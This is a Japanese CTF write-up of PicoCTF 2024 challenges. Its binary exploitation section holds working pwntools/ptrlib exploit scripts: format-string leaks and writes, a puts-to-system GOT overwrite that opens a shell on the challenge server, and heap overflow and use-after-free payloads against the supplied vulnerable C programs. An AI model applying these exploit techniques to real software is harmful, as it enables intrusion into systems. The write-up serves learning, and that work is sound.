PicoCTF 2024に参加したのでWriteupを書きました。
解いた問題は以下の通り。
- Binary Exploitation
	- [x] format string0
	- [x] format string1
	- [x] format string2
	- [x] format string3
	- [x] heap 0
	- [x] heap 1
	- [x] heap 2
	- [x] heap 3
	- [ ] babygame03
	- [ ] high frequency troubles
- Cryptography
	- [x] interencdec
	- [x] custom encryption
	- [ ] c3
	- [ ] rsa_oracle
	- [ ] flag_printer
- Forensics
	- [x] scan surprise
	- [x] verify
	- [x] canyousee
	- [x] secret of the polyglot
	- [x] mob psycho
	- [x] endianness-v2
	- [ ] blast from the past
	- [ ] dear diary
- General Skills
	- [x] super ssh
	- [x] commitment issues
	- [x] time machine
	- [x] blame game
	- [x] collaborative development
	- [x] binhexa
	- [x] binary search
	- [x] endianness
	- [x] dont-you-love-banners
	- [ ] sansalpha
- Reverse Engineering
	- [x] packer
	- [x] factcheck
	- [ ] winantidbg0x100
	- [x] classic crackme 0x100
	- [ ] weirdsnake
	- [ ] winantidbg0x200
	- [ ] winantidbg0x300
- Web Exploitation
	- [x] bookmarklet
	- [x] webdecode
	- [x] introtoburp
	- [x] unminify
	- [x] no sql injection
	- [x] trickster
	- [ ] elements

去年よりも成長していて嬉しい。
# Binary Exploitation
## format string 0
ソースコードが渡された。
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();

    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```
入力に`{"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"}`以外の文字列が含まれていた場合、入力がそのまま`printf`に渡されている。また、`main`関数内でflagを読み込んでいる。よって、普通にメモリをリークすれば良い。
*command:* 
```bash
python -c 'print("%s" * 24)' | ./format-string-0
```
*output:*
```
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: There is no such burger yet!

picoCTF{fake_local_flag}
```
## format string 1
ソースコードが渡された。
```c
#include <stdio.h>


int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```
`scanf`で入力を受け取り、そのまま`printf`に渡している。
format string0と同じように%sを大量に渡してメモリリークをしようとすると`segmentation fault`が起こってしまうので、`%x`でリークして文字列に変換する。
*command1:*
```bash
python -c 'print("%lx."*20)' | ./format-string-1
```
*output1:*
```
Give me your order and I'll read it back to you:
Here's your order: 7ffdf8a41a10.0.0.a.400.9.0.0.7ac85b362ab0.7ffd00000000.7ffdf8a41c38.0.7ffdf8a41c40.7b4654436f636970.636f6c5f656b6166.7d67616c665f6c61.a.0.7ac85b3577b7.7ac85b363680.
Bye!
```
*command2:*
```bash
python decode.py 7ffdf8a41a10.0.0.a.400.9.0.0.7ac85b362ab0.7ffd00000000.7ffdf8a41c38.0.7ffdf8a41c40.7b4654436f636970.636f6c5f656b6166.7d67616c665f6c61.a.0.7ac85b3577b7.7ac85b363680
```
*output2:*
```
b'\x10\x1a\xa4\xf8\xfd\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0*6[\xc8z\x00\x00\x00\x00\x00\x00\xfd\x7f\x00\x008\x1c\xa4\xf8\xfd\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x1c\xa4\xf8\xfd\x7f\x00\x00picoCTF{fake_local_flag}\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb7w5[\xc8z\x00\x00\x8066[\xc8z\x00\x00'
```
## format string2
ソースコードが渡された。
```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```
format stringで`sus`の値を改変できれば良い。
pwntoolsを使って自動化した。
```python
#!/usr/bin/env python

import pwn
import sys

exe = pwn.ELF("./vuln")
pwn.context.binary = exe


def connect(remote: bool):
    if remote:
        return pwn.remote("rhea.picoctf.net", 51654)
    else:
        return pwn.process(exe.path)


def send(p):
    io = connect(False)

    pwn.log.info("payload  = %s" % repr(p))
    io.sendline(p)
    resp = io.recvall()
    if b"picoCTF" in resp:
        pwn.log.info("Flag = %s" % resp)
    return resp


sus_addr = 0x404060

fs = pwn.FmtStr(execute_fmt=send)
fs.write(sus_addr, 0x67616C66)
fs.execute_writes()
```
## format string 3
ソースコードが渡された。
```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
        puts("Howdy gamers!");
        printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
        char *all_strings[MAX_STRINGS] = {NULL};
        char buf[1024] = {'\0'};

        setup();
        hello();

        fgets(buf, 1024, stdin);
        printf(buf);

        puts(normal_string);

        return 0;
}
```
`main`関数の最後に`"/bin/sh"`を`puts`に渡すというこれ見よがしな処理をしている。
また、明らかなformat stringの脆弱性がある。よって、format stringで`puts`のGOTを`system`に書き換えればシェルが取れそう。
```python
#!/usr/bin/env python3
import pwn

exe = pwn.ELF("./format-string-3_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")
pwn.context.binary = exe

payload = b""


def connect():
    # io = pwn.process(exe.path)
    io = pwn.remote("rhea.picoctf.net", 64906)
    return io


def b(x):
    return x.to_bytes(8, "little")


def send(p):
    global payload
    io = pwn.process(exe.path)
    io.sendline(p)
    payload = p
    resp = io.recvall()
    return resp


def main():
    io = connect()

    io.recvuntil(b"setvbuf in libc: ")
    leak = int(io.recvline().strip(), 16)
    libc.address = leak - libc.symbols["setvbuf"]

    pwn.log.info("libc.address = %s" % hex(libc.address))

    fs = pwn.FmtStr(execute_fmt=send)
    fs.write(exe.got["puts"], libc.symbols["system"])
    fs.execute_writes()

    with open("./payload", "wb") as f:
        f.write(payload)

    io.sendline(payload)
    io.recvuntil(b"\x18@@")
    io.interactive()


if __name__ == "__main__":
    main()
```
## heap0
ソースコードが渡された。
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nWelcome to heap0!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
        int rval = scanf("%d", &choice);
        if (rval == EOF){
            exit(0);
        }
        if (rval != 1) {
            //printf("Invalid input. Please enter a valid choice.\n");
            //fflush(stdout);
            // Clear input buffer
            //while (getchar() != '\n');
            //continue;
            exit(0);
        }

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
heap領域に`safe_var`と`input_var`という変数を確保して`input_var`に値を書いたり読んだり、フラグの読み取りを試みたりできるプログラムになっている。

`init`でmallocを使って`safe_var`と`input_var`を作り、それぞれ、`"pico"`と`"bico"`に初期化している。init関数終了時点でのheapは以下のようになっている。
```
0x5555555596a0                          0x0000000000000021      ........!.......
0x5555555596b0  0x000000006f636970      0x0000000000000000      pico............
0x5555555596c0  0x0000000000000000      0x0000000000000021      ........!.......
0x5555555596d0  0x000000006f636962      0x0000000000000000      bico............
0x5555555596e0  0x0000000000000000      0x0000000000020921      ........!.......
```
`write_buffer`では入力のサイズを確認せず、そのまま`input_data`に書き込んでいる。
よって、ここにheap overflowの脆弱性がある。
フラグを得るには`safe_var`の値`"bico"`を他の適当な値に改変すれば良いので、exploitは以下のようになる。
```python
#!/usr/bin/env python
import pwn


def connect():
    return pwn.process("./vuln")


io = connect()
io.sendline(b"2")
io.sendline(b"a" * 33)
io.sendline(b"4")
io.recvuntil(b"YOU WIN\n")


print(io.recvline())
```
## heap1
ソースコードが渡された。
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nWelcome to heap1!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
        if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
heap0とほとんど同じだが、フラグを得るための条件が`safe_var`の値を`"pico"`に変更するというものに変わっている。よってexploitは以下のようになる。
```python
#!/usr/bin/env python
import pwn


def connect():
    return pwn.process("./chall")


io = connect()
io.sendline(b"2")
payload = b""
payload += b"A" * 32
payload += b"pico"
io.sendline(payload)
io.sendline(b"4")
io.recvuntil(b"YOU WIN\n")
print(io.recvline())
```
## heap2
ソースコードが渡された。
```c
include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
        if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
プログラムの構造はこれまでと同じ。しかし、今回は`check_win`で条件を満たしていたらフラグを出力するのではなく、`x`の値を関数として呼んでいる。
今回はフラグを出力する`win`という関数があるので、`x`の値を`win`のアドレスに変更できればフラグを獲得できる。
```python
#!/usr/bin/env python

import ptrlib as ptr

io = ptr.Process("./chall")

win_addr = 0x00000000004011A0

io.recvuntil(b"Enter your choice: ")
io.sendline(b"2")
io.sendline(b"A" * 32 + ptr.p64(win_addr))
io.sendline(b"4")

print(io.recvlineafter(b"Enter your choice:"))
```
## heap3
ソースコードが渡された。
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf("\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}

void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x->flag, x->flag);
    printf("+-------------+-----------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
        if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            alloc_object();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x->flag);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            free_memory();
            break;
        case 6:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
heap2までとほとんど同じ。`free_memory`で`x`を解放し、`alloc_object`で`x`と同じサイズで`malloc`して、そこの30番目に`"pico"`を書き込む。
```python
#!/usr/bin/env python

import ptrlib as ptr

def connect():
    p = ptr.Process("./chall")
    # p = ptr.Socket("tethys.picoctf.net", 65386)
    return p


io = connect()
io.sendline(b"5")
io.sendline(b"2")
io.sendline(b"35")

payload = b""
payload += b"A" * 30
payload += b"pico"

io.sendline(payload)
io.sendline(b"4")

print(io.recvlineafter("YOU WIN!!11!!\n"))
```
# Cryptography
## interencdec
以下の内容のファイルが渡された。
```
YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclgya3lNRFJvYTJvMmZRPT0nCg==
```
base64っぽいのでデコード。
```
d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrX2kyMDRoa2o2fQ==
```
これもbase64っぽいのでデコード
```
wpjvJAM{jhlzhy_k3jy9wa3k_i204hkj6}
```
シーザー暗号っぽいので解読
```
picoCTF{caesar_d3cr9pt3d_b204adc6}
```
## custom encryption
暗号化プログラムのソースコードとフラグを暗号化したときの出力が渡された。
```python
from random import randint
import sys


def generator(g, x, p):
    return pow(g, x) % p


def encrypt(plaintext, key):
    cipher = []
    for char in plaintext:
        cipher.append(((ord(char) * key*311)))
    return cipher


def is_prime(p):
    v = 0
    for i in range(2, p + 1):
        if p % i == 0:
            v = v + 1
    if v > 1:
        return False
    else:
        return True


def dynamic_xor_encrypt(plaintext, text_key):
    cipher_text = ""
    key_length = len(text_key)
    for i, char in enumerate(plaintext[::-1]):
        key_char = text_key[i % key_length]
        encrypted_char = chr(ord(char) ^ ord(key_char))
        cipher_text += encrypted_char
    return cipher_text


def test(plain_text, text_key):
    p = 97
    g = 31
    if not is_prime(p) and not is_prime(g):
        print("Enter prime numbers")
        return
    a = randint(p-10, p)
    b = randint(g-10, g)
    print(f"a = {a}")
    print(f"b = {b}")
    u = generator(g, a, p)
    v = generator(g, b, p)
    key = generator(v, a, p)
    b_key = generator(u, b, p)
    shared_key = None
    if key == b_key:
        shared_key = key
    else:
        print("Invalid key")
        return
    semi_cipher = dynamic_xor_encrypt(plain_text, text_key)
    cipher = encrypt(semi_cipher, shared_key)
    print(f'cipher is: {cipher}')


if __name__ == "__main__":
    message = sys.argv[1]
    test(message, "trudeau")
```
```
a = 94
b = 29
cipher is: [260307, 491691, 491691, 2487378, 2516301, 0, 1966764, 1879995, 1995687, 1214766, 0, 2400609, 607383, 144615, 1966764, 0, 636306, 2487378, 28923, 1793226, 694152, 780921, 173538, 173538, 491691, 173538, 751998, 1475073, 925536, 1417227, 751998, 202461, 347076, 491691]
```
このプログラムには、基本的に不可逆的で値を復元するのに工夫が必要な演算が含まれていない。したがってそのまま逆の処理をするプログラムを書けば良い。
```python
#!/usr/bin/env python
from random import randint
import sys


def generator(g, x, p):
    return pow(g, x) % p


def is_prime(p):
    v = 0
    for i in range(2, p + 1):
        if p % i == 0:
            v = v + 1
    if v > 1:
        return False
    else:
        return True


def decrypt(cipher, key):
    plain = ""
    for char in cipher:
        p = (char // 311) // key
        plain += chr(p)
    return plain


def semi_decrypt(cipher, key):
    cipher_list = list(cipher)
    cipher_list.reverse()
    cipher = "".join(cipher_list)
    plain = ""
    key_length = len(key)
    for i, char in enumerate(cipher[::-1]):
        key_char = key[i % key_length]
        print(f"key_char: {ord(key_char)}")
        print(f"ec: {ord(char)}")
        decrypted_char = chr(ord(char) ^ ord(key_char))
        print(f"decrypted_char: {ord(decrypted_char)}")
        plain += decrypted_char
    return plain


a = 94
b = 29
cipher = [
    260307,
    491691,
    491691,
    2487378,
    2516301,
    0,
    1966764,
    1879995,
    1995687,
    1214766,
    0,
    2400609,
    607383,
    144615,
    1966764,
    0,
    636306,
    2487378,
    28923,
    1793226,
    694152,
    780921,
    173538,
    173538,
    491691,
    173538,
    751998,
    1475073,
    925536,
    1417227,
    751998,
    202461,
    347076,
    491691,
]

p = 97
g = 31
text_key = "trudeau"

u = generator(g, a, p)
v = generator(g, b, p)
key = generator(v, a, p)
b_key = generator(u, b, p)

shared_key = None
if key == b_key:
    shared_key = key
else:
    print("Invalid key")
    exit()

semi_cipher = decrypt(cipher, shared_key)
plain = semi_decrypt(semi_cipher, text_key)
plain_list = list(plain)
plain_list.reverse()
print("".join(plain_list))
```
# Forensic
## scan surprise
QRコードを渡されたので素直に読み取る。
```
picoCTF{p33k_@_b00_a81f0a35}
```
## verify
sshでアクセスするとホームディレクトリにはこんなファイル群を含むdrop-inというディレクトリがあった。
```
.
./checksum.txt
./decrypt.sh
./files
./files/00011a60
./files/022cvpdN
./files/04nLilRD
./files/0MT2Wrui
...他にもたくさん
```
files内のファイルのどれかをdecrypt.shで復元すれば良さそう。
仲間はずれ探しをしてみる。
```
file $(find .)
```
そうすると仲間はずれが見つかった。
```
./00011a60: openssl enc'd data with salted password
./022cvpdN: ASCII text
./04nLilRD: ASCII text
./0MT2Wrui: Motorola S-Record; binary data in text format
./0SGMttmR: ASCII text
./0fCDySFB: ASCII text
./0hHVJSPh: ASCII text
...他にもたくさん
```
一番始めを解読してみるとフラグを獲得できた。
```bash
./decrypt.sh files/00011a60
```
```
picoCTF{trust_but_verify_00011a60}
```
## canyousee
`ukn_reality.jpg`というjpgファイルを渡された。exiftoolでメタデータを見てみる。
```bash
exiftool ukn_reality.jpg
```
```
ExifTool Version Number         : 12.76
File Name                       : ukn_reality.jpg
Directory                       : .
File Size                       : 2.3 MB
File Modification Date/Time     : 2024:02:16 07:40:21+09:00
File Access Date/Time           : 2024:04:07 16:19:07+09:00
File Inode Change Date/Time     : 2024:03:13 16:15:33+09:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
XMP Toolkit                     : Image::ExifTool 11.88
Attribution URL                 : cGljb0NURntNRTc0RDQ3QV9ISUREM05fYTZkZjhkYjh9Cg==
Image Width                     : 4308
Image Height                    : 2875
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 4308x2875
Megapixels                      : 12.4
```
怪しいbase64っぽい文字列が見えたのでデコードしてみる。
```bash
echo cGljb0NURntNRTc0RDQ3QV9ISUREM05fYTZkZjhkYjh9Cg== | base64 -d
```
```
picoCTF{ME74D47A_HIDD3N_a6df8db8}
```
## secret of the polyglot
`flag2of2-final.pdf`というpdfファイルが渡された。`file`で調べるとこのファイルはpngらしい。[pdfとして開いてみると](https://artifacts.picoctf.net/c_titan/96/flag2of2-final.pdf)、フラグの後半が獲得できる。
pngとして開いてみると前半が手に入る。
```
picoCTF{f1u3n7_1n_pn9_&_pdf_90974127}
```
## mob psycho
apkファイルが渡されたのでapktoolで展開してみる。
この後いろいろ探したのだが、手がかりが見つからなかった。
よって、展開の各段階ごと調べていく。
まずはunzipしてdexファイル群の段階にする。そのこのファイル群を調べていたら、`res/color/flag.txt`を見つけた。
## endianness-v2
謎のバイナリデータを渡された。問題文に、32bitシステム上から取得されたデータであると書いてあったので、メモリダンプだと予想し、データを4バイトずつ反転してみることにした。
```python
#!/usr/bin/env python

with open("./file", "rb") as f:
    data = list(f.read())

output = []

print(len(data))
for i in range(0, len(data) // 4, 1):
    each = data[i * 4 : i * 4 + 4]
    each.reverse()
    for j in each:
        output.append(j)


with open("./file.out", "wb") as f:
    f.write(bytes(output))
```
予想通りメモリダンプだった。デコードした結果フラグが写ったjpegファイルが生成された。
# General Skills
## super ssh
sshサーバーにアクセスしたらフラグが出力されて通信が切れた。
```
ssh -p 53176 ctf-player@titan.picoctf.net
```
```
ctf-player@titan.picoctf.net's password:
Welcome ctf-player, here's your flag: picoCTF{s3cur3_c0nn3ct10n_8969f7d3}
Connection to titan.picoctf.net closed.
```
## commitment issues
gitリポジトリが配られた。
とりあえずログを見る。
```bash
git log
```
```
commit e1237df82d2e69f62dd53279abc1c8aeb66f6d64 (HEAD -> master)
Author: picoCTF <ops@picoctf.com>
Date:   Sat Mar 9 21:10:14 2024 +0000

    remove sensitive info

commit 3d5ec8a26ee7b092a1760fea18f384c35e435139
Author: picoCTF <ops@picoctf.com>
Date:   Sat Mar 9 21:10:14 2024 +0000

    create flag
```
`3d5ec8a26ee7b092a1760fea18f384c35e435139`このコミットでフラグが作られたらしい。
```
git checkout 3d5ec8a26ee7b092a1760fea18f384c35e435139
cat message.txt
```
```
picoCTF{s@n1t1z3_30e86d36}
```
## time machine
gitリポジトリが配られた。logを見たら、メッセージがフラグのコミットがあった。
```
git log
```
```
commit 705ff639b7846418603a3272ab54536e01e3dc43 (HEAD -> master)
Author: picoCTF <ops@picoctf.com>
Date:   Sat Mar 9 21:10:36 2024 +0000

    picoCTF{t1m3m@ch1n3_b476ca06}
```
## blame game
